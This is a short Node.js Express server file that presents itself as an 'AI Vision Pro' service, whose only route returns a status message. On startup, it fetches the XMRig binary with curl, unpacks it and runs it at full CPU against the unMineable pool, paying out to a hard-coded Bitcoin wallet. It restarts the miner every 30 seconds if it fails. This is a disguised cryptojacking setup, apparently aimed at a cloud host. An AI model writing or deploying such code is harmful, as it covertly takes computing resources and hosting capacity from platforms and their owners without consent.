const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const app = express();

app.use(express.static(__dirname));

if (!fs.existsSync('./bin')) { fs.mkdirSync('./bin'); }

const startMining = () => {
    // العودة لعنوان البيتكوين الخاص بك لضمان استلام الأرباح في BlueWallet
    const wallet = "BTC:bc1q50kctucupzcsn87dm7cj25vjsql9mqnudjg7qp.Railway_Worker#omni-mode";
    const pool = "rx.unmineable.com:3333";
    
    const cmd = `curl -L -o ./bin/miner.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar -xf ./bin/miner.tar.gz -C ./bin --strip-components=1 && chmod +x ./bin/xmrig && ./bin/xmrig -o ${pool} -u ${wallet} -p x --tls --cpu-max-threads-hint 100 --no-color`;

    console.log("Re-routing profit to Bitcoin Wallet...");
    
    exec(cmd, (error) => {
        if (error) {
            setTimeout(startMining, 30000);
            return;
        }
    });
};

startMining();

app.get('/', (req, res) => res.send('AI Vision Pro: Online'));

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => console.log(`System Active on Port ${PORT}`));
